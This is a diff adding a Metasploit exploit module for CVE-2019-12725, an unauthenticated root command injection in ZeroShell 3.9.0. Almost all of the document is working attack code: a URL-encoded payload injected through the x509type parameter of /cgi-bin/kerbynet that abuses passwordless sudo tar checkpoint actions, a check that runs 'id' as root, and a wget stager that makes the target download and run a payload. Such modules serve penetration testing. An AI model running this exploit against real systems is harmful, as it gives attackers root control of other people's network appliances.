@@ -1,0 +1,94 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Zeroshell 3.9.0 Remote Command Execution',
+      'Description'    => %q{
+        This module exploits an unauthenticated command injection vulnerability 
+        found in ZeroShell 3.9.0 in the "/cgi-bin/kerbynet" url. 
+        As sudo is configured to execute /bin/tar without a password (NOPASSWD)
+        it is possible to run root commands using the "checkpoint" tar options.
+      },
+      'Author'         => [
+        'Juan Manuel Fernandez', # Vulnerability discovery
+        'Giuseppe Fuggiano <giuseppe[dot]fuggiano[at]gmail.com>', # Metasploit module
+      ],
+      'References'     => [
+        ['CVE', '2019-12725'],
+        ['URL', 'https://www.tarlogic.com/advisories/zeroshell-rce-root.txt'],
+        ['URL', 'https://github.com/X-C3LL/PoC-CVEs/blob/master/CVE-2019-12725/ZeroShell-RCE-EoP.py']
+      ],
+      'DisclosureDate' => 'Jul 17 2019',
+      'License'        => MSF_LICENSE,
+      'Privileged'     => true, 
+      'Platform'       => [ 'unix', 'linux' ],
+      'Arch'           => [ ARCH_X86 ],
+      'Targets'        => [
+       ['Zeroshell 3.9.0 (x86)', {
+         'Platform'    => 'linux',
+         'Arch'        => ARCH_X86,
+        }],
+      ],
+      'DefaultTarget'  => 0,
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
+      ])
+  end
+
+  def execute_command(cmd, opts = {})
+    command_payload  = "%27%0A%2Fetc%2Fsudo+tar+-cf+%2Fdev%2Fnull+%2Fdev%2Fnull+--checkpoint%3d1+--checkpoint-action%3dexec%3d%22#{filter_bad_chars(cmd)}%22%0A%27"
+
+    print_status("Sending stager payload...")
+
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/cgi-bin/kerbynet',
+      'encode_params' => false,
+      'vars_get' => {
+        'Action' => 'x509view',
+        'Section' => 'NoAuthREQ',
+        'User' => '',
+        'x509type' => command_payload
+      }
+    )
+
+    return res
+  end
+
+  def filter_bad_chars(cmd)
+    cmd.gsub!(/chmod \+x/, 'chmod 777')
+    cmd.gsub!(/;/, " %0A ")
+    cmd.gsub!(/ /, '+')
+    cmd.gsub!(/\//, '%2F')
+    return cmd
+  end
+
+  def check
+    res = execute_command('id')
+    if res && res.body.include?("uid=0(root)")
+      Exploit::CheckCode::Appears
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    print_status("Exploiting...")
+    execute_cmdstager(flavor: :wget, delay: 5)
+  end
+
+end
